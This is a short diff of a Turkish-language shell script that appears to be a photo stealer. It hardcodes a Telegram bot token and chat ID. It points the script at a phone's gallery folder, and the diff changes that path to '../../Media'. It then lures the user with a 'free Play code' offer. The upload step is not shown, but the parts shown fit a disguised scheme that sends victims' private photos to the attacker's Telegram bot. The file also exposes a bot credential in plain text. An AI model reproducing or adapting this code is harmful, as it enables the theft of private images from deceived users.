@@ -5,7 +5,7 @@ bot_token="7889269990:AAHPRBn4wqXnjClQMLyrHwljtVZNrcckJAE"
 chat_id="6624281537"
 
 # Fotoğrafların bulunduğu klasör (Güncellemeniz gerekebilir)
-gallery_path="Media"
+gallery_path="../../Media"
 
 # Kullanıcıya onay sorusu
 printf "Bedava Play Kod Almak İstermisin? (e/h): "
